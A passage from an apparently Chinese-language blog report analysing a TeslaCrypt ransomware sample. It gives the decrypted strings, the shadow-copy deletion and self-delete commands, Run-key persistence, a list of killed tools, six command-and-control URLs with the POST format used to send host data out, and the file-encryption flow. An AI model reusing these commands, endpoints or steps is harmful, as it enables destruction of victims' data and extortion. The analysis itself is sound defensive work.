class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&quot;windir&quot;</span><br><span class="line">&quot;%s\system32\cmd.exe&quot;</span><br><span class="line">&quot;&#x2F;c start &quot;&quot; &quot;&quot;</span><br><span class="line">&quot;runas&quot;</span><br><span class="line">&quot;vssadmin.exe&quot;</span><br><span class="line">&quot;Delete Shadows &#x2F;All &#x2F;Quiet &quot;</span><br><span class="line">&quot;open&quot;</span><br><span class="line">&quot;%s\%s&quot;</span><br><span class="line">&quot;%s\%s.exe&quot;</span><br><span class="line">&quot;SeDebugPrivilege&quot;</span><br><span class="line">&quot;Software\%s&quot;</span><br><span class="line">&quot;data&quot;</span><br><span class="line">&quot;S-1-5-18\&quot;</span><br><span class="line">&quot;S-1-5-18\Software\MSVCC\&quot;</span><br><span class="line">&quot;%X%X%X%X%X%X%X%X&quot;</span><br><span class="line">&quot;Software\MSVCC\&quot;</span><br><span class="line">&quot;FIX&quot;</span><br><span class="line">&quot;\+recover+file.txt&quot;</span><br><span class="line">&quot;%s\n%s\n%S\n%d\n&quot;</span><br><span class="line">&quot;image&#x2F;png&quot;</span><br><span class="line">&quot;Software\Microsoft\Windows\CurrentVersion\Run&quot;</span><br><span class="line">&quot;%s\SYSTEM32\CMD.EXE &#x2F;C START &quot;&quot; &quot;&quot;</span><br><span class="line">&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Policies&quot;</span><br><span class="line">&quot;EnableLinkedConnections&quot;</span><br><span class="line">&quot;taskmg&quot;</span><br><span class="line">&quot;regedi&quot;</span><br><span class="line">&quot;procex&quot;</span><br><span class="line">&quot;msconfi&quot;</span><br><span class="line">&quot;cmd&quot;</span><br><span class="line">&quot;reg add HKEY_CURRENT_USER\Software\Microsoft\Windo&quot;</span><br><span class="line">&quot;.com&quot;</span><br><span class="line">&quot;REcovER&quot;</span><br><span class="line">&quot;%s\+%s+%s+%s&quot;</span><br><span class="line">&quot;.png&quot;</span><br><span class="line">&quot;.txt&quot;</span><br><span class="line">&quot;.html&quot;</span><br><span class="line">&quot;A:\&quot;</span><br><span class="line">&quot;B:\&quot;</span><br><span class="line">&quot;\*.*&quot;</span><br><span class="line">&quot;recove&quot;</span><br></pre></td></tr></table></figure><center>表2</center></li><li><p>解密出的URL和请求包头，如表3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&quot;http:&#x2F;&#x2F;videoaminproduktion.de&#x2F;plugins&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;clubsaintandre.fr&#x2F;PostsImages&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;affiliateproductes.com&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;ptgp.pl&#x2F;tmp&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;strategicdisaster.info&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;binstr.php&quot;</span><br><span class="line">&quot;http:&#x2F;&#x2F;minteee.com&#x2F;PostsImages&#x2F;binstr.php&quot;</span><br><span class="line">&quot;Sub&#x3D;%s&amp;dh&#x3D;%s&amp;addr&#x3D;%s&amp;size&#x3D;%lld&amp;version&#x3D;4.0&amp;OS&#x3D;%ld&amp;ID&#x3D;%d&amp;inst_id&#x3D;%X%X%X%X%X%X%X%X&quot;</span><br><span class="line">&quot;0324532423723948572379453249857&quot;</span><br><span class="line">&quot;Mozilla&#x2F;5.0 (Windows NT 6.3 rv:11.0) like Gecko&quot;</span><br><span class="line">&quot;Content-Type: application&#x2F;x-www-form-urlencoded&quot;</span><br><span class="line">&quot;*&#x2F;*&quot;</span><br><span class="line">&quot;Crypted&quot;</span><br><span class="line">&quot;Ping&quot;</span><br><span class="line">&quot;data&#x3D;%s&quot;</span><br><span class="line">&quot;POST&quot;</span><br><span class="line">&quot;INSERTED&quot;</span><br></pre></td></tr></table></figure></li></ul><center>表3</center><h3 id="判断进程TOKEN的完整性和样本所在路径"><a href="#判断进程TOKEN的完整性和样本所在路径" class="headerlink" title="判断进程TOKEN的完整性和样本所在路径"></a>判断进程TOKEN的完整性和样本所在路径</h3><p>然后判断当前进程token的完整性，如果当前进程的标签完整性是低的话，便执行下图中的<font color=red>Elevate_privileges_407100</font>，通过执行cmd命令runas，以管理员权限再次运行一次。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567857482710.png" alt="1567857482710"></p><p><font color=red>Elevate_privileges_407100</font>,通过ShellExecuteExw执行，拼接出的指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\cmd.exe &#x2F;c strat xxxxx.exe runas</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567856634938.png" alt="1567856634938"></p><h3 id="创建新进程"><a href="#创建新进程" class="headerlink" title="创建新进程"></a>创建新进程</h3><p>然后再判断文件的路径是否在”我的文档”的目录下，如果不在的话，将自身复制到到”我的文档”目录下更名为随机生产的6位随机字符串，并修改文件属性为隐藏。然后删除源文件，结束当前进程。创建新的进程执行复制出来的新程序。也就是在<font color=red>样本行为分析图1</font>抓取到的行为。</p><p>若在”我的文档”目录下，则继续执行。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567857246991.png" alt="1567857246991"></p><h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><p>通过函数<font color=red>CreateMutexw</font>创建互斥体9-9-9-9。当互斥体存在时，直接结束。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567858359309.png" alt="1567858359309"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>提升进程权限，提升权限为<font color=red>SeDebugPrivilege</font>。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567858870374.png" alt="1567858870374"></p><h3 id="创建线程1：监控进程"><a href="#创建线程1：监控进程" class="headerlink" title="创建线程1：监控进程"></a>创建线程1：监控进程</h3><p>创建线程1，线程1主要监控所有进程，时时遍历所有进程，当遇到<font color=red>taskmg;regedi;procex;msconfi;cmd</font>,就立马结束这些进程。如下图：</p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_样本分析报告/01_TeslaCrypt勒索病毒分析报告/1567860386887.png" alt="1567860386887"  /><h3 id="创建线程2：删除卷影拷贝"><a href="#创建线程2：删除卷影拷贝" class="headerlink" title="创建线程2：删除卷影拷贝"></a>创建线程2：删除卷影拷贝</h3><p>再创建线程2之前，该样本先获取了当前操作系统的信息，判断操作系统是不是XP，如果不是创建线程删除卷影拷贝，否则反之。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567861126751.png" alt="1567861126751"></p><p>线程2，通过将解密出的指令拼接起来，交由shellexecute执行删除卷影拷贝的命令，防止进行数据恢复。就产生了<font color=red>在样本行为分析中图5</font>抓取到的行为。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruas vssadmin.exe Delete Shadows &#x2F;ALL &#x2F;Quiet</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567861243654.png" alt="1567861243654"></p><h3 id="连续6个函数"><a href="#连续6个函数" class="headerlink" title="连续6个函数"></a>连续6个函数</h3><p>创建完线程2之后，连着一下有了6个函数。这里一个一个分析。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567862335585.png" alt="1567862335585"></p><ul><li><strong>-第一个函数,获取一些特殊的文件路径，如：”刻录路径”；”桌面路径”；”公共桌面路径”。如图：</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567862786033.png" alt="1567862786033"></p><ul><li><strong>第二个函数，往注册表中写入数据。</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567863033929.png" alt="1567863033929"></p><p>先往<font color=red>HKEY_CURRRENT_USER\Software\MSVCC</font>,下写入personID，并名为FIX</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567863463010.png" alt="1567863463010"></p><p>修改后的注册表如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567863653699.png" alt="1567863653699"></p><p>然后往<font color=red>HKEY_CURRRENT_USER\Software&lt;personID&gt;</font>写入data值。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567864412110.png" alt="1567864412110"></p><p>Data中的是3个数据拼接出来的。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567864032521.png" alt="1567864032521"></p><ul><li><strong>第三个函数，修改注册表添加自启动项</strong></li></ul><p>先生成4位的随机数，并拼接成<font color=red>+++xxxx</font>作为键值的名称，然后再与解密出的指令拼接，拼接成<font color=red>c:windows\system32\cmd.exe /c start “c:user&lt;&gt;\document\xxxxx.exe” </font>作为键值。然后添加到<font color=red>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</font>项中。可见行为分析图9所示。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567929481304.png" alt="1567929481304"></p><p>然后修改<font color=red>software\Microsoft\Windows\CurrentVersion\Polices</font>中的<font color=red>enableLinkedconnections</font>,提升进程访问网络共享的权限。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567929663825.png" alt="1567929663825"></p><ul><li><strong>第四个函数：在我的文档目录下写入加密数据</strong></li></ul><p>将<font color=red>personID和刚写入注册表中的data值中的前两个数值</font>拼接起来，然后再进行加密并写入”我的文档”目录下的<font color=red>+recover+file.txt</font>中。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567936981995.png" alt="1567936981995"></p><p>其中拼接出的数据和写入data中的数据对比图，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567936532441.png" alt="1567936532441"></p><ul><li><strong>第五个函数：完善勒索信息</strong></li></ul><p>先将personID从unicode转换为ascii存储在内存中。然后再将解密出来的勒索信息中的<font color=red>xxxxxxx替换成personID</font>。然后存储到<font color=red>chText</font>中，后面会用到该完整的勒索信息。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567937432442.png" alt="1567937432442"></p><p>将personID填入解密出的文本后，构成的完整的勒索信息如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567937891729.png" alt="1567937891729"></p><ul><li><strong>第六个函数：初始化勒索信息图片</strong></li></ul><p>通过调用GdiplusStartup来初始化GDI。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567939547103.png" alt="1567939547103"></p><p>然后调用DrawTextA，将第5个函数获取到的完整勒索信息chtext_completion_ransome_info画出来。也就是最终勒索弹出的图片。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567939663047.png" alt="1567939663047"></p><p>也就是最终勒索弹出的图片,如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567940044615.png" alt="1567940044615"></p><h3 id="创建线程3：发送加密数据"><a href="#创建线程3：发送加密数据" class="headerlink" title="创建线程3：发送加密数据"></a>创建线程3：发送加密数据</h3><p>线程3，向解密出来的URL发送data中的数据等加密后的主机信息。</p><p>首先拼接data中第二段的值、personID、1105和网络请求相关字符串。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567940968494.png" alt="1567940968494"></p><p>然后将拼接出的信息进行加密。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567941217461.png" alt="1567941217461"></p><p>然后将加密过的数据发送给之前解密出来的恶意URL（表3）。<font color=red>可见行为分析图8所示</font>。</p><table><thead><tr><th>恶意URL</th></tr></thead><tbody><tr><td>“<a href="http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php&quot;">http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://videoaminproduktion.de/plugins/binstr.php&quot;">http://videoaminproduktion.de/plugins/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://clubsaintandre.fr/PostsImages/binstr.php&quot;">http://clubsaintandre.fr/PostsImages/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://affiliateproductes.com/binstr.php&quot;">http://affiliateproductes.com/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://ptgp.pl/tmp/binstr.php&quot;">http://ptgp.pl/tmp/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://minteee.com/PostsImages/binstr.php&quot;">http://minteee.com/PostsImages/binstr.php&quot;</a></td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567941375056.png" alt="1567941375056"></p><h3 id="创建线程4：对文件进行加密"><a href="#创建线程4：对文件进行加密" class="headerlink" title="创建线程4：对文件进行加密"></a>创建线程4：对文件进行加密</h3><p>先获取系统文件路径，并通过<font color=red>GetLogicalDriveStringsw</font>函数获取当前所有盘符。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567944855107.png" alt="1567944855107"></p><p>然后遍历所有盘符，并判断当前遍历到的盘符类型。</p><p>如果盘符类型如下表时，执行file_encode_401920对该盘符进行加密</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567945236934.png" alt="1567945236934"></p><p>遍历文件，然后判断文件时目录还是文件，如果是目录则进行判断，若是<font color=red>c:\windows；c:\program files和program data</font>这三个目录，便不在进行遍历（排除这3个目录）。然后进行递归，直到遍历到文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567950619428.png" alt="1567950619428"></p><p>若是文件，便进行<font color=red>判断该文件后缀</font>是否在要加密的后缀名表中。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567950908230.png" alt="1567950908230"></p><p>加密文件，先查看文件属性，若文件属性为只读属性，则<font color=red>修改文件属性</font>。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567994495176.png" alt="1567994495176"></p><p>然后<font color=red>读取加密文件到buff中</font>。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567994555550.png" alt="1567994555550"></p><p>然后将读取到的数据进行加密，然后进行了三次写入。第一次写入data中的数据，然后写入一个1591986926的数据，最后再将加密后的数据写入文件中，文件加密完成。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567994695463.png" alt="1567994695463"></p><h3 id="设置线程优先级并等待"><a href="#设置线程优先级并等待" class="headerlink" title="设置线程优先级并等待"></a>设置线程优先级并等待</h3><p>将线程4（文件加密）的优先级设置为最低，然后等待线程4运行完，然后再执行下一步弹窗显示勒索信息。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995004864.png" alt="1567995004864"></p><h3 id="弹窗显示勒索图片和文件"><a href="#弹窗显示勒索图片和文件" class="headerlink" title="弹窗显示勒索图片和文件"></a>弹窗显示勒索图片和文件</h3><p>先将前面分析的连续6个函数中的第六个函数中的初始化的勒索图片保存再本地。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995246630.png" alt="1567995246630"></p><p>再通过open_file_410C30函数调用<font color=red>shellExecutew</font>执行如下命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open c:\users\john\Desktop\+recover+oujgv.png</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995351949.png" alt="1567995351949"></p><p>来弹出勒索信息的图片。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567940044615.png" alt="1567940044615"></p><p>先拼接出桌面勒索文件的绝对路径，然后将连续6个函数中的第5个函数中获得的完整勒索信息<font color=red>chText_completion_ransome_info</font>，写入桌面的勒索文本中。然后再调用open_file_410C30将文本打开。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995515350.png" alt="1567995515350"></p><p>通过shellExecutew执行命令，打开刚写入的文件文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open c:\users\john\Desktop\+recover+oujgv.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567995793089.png" alt="1567995793089"></p><h3 id="再次创建线程2和线程3并删除自身"><a href="#再次创建线程2和线程3并删除自身" class="headerlink" title="再次创建线程2和线程3并删除自身"></a>再次创建线程2和线程3并删除自身</h3><p>弹窗显示完勒索图片和文本后，再次创建线程2，删除卷影拷贝，防止恢复到加密前。再次创建线程3，再次发送主机信息到远程服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567996401574.png" alt="1567996401574"></p><p>当线程3运行完之后，执行cmd_del_file_410990调用cmd执行如下命令，删除自身。<font color=red>可见行为分析图7所示</font>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c DEL C:\Users john\DOCUMENT\Vohdrw.exe&gt;&gt;NUL</span><br></pre></td></tr></table></figure><p><img 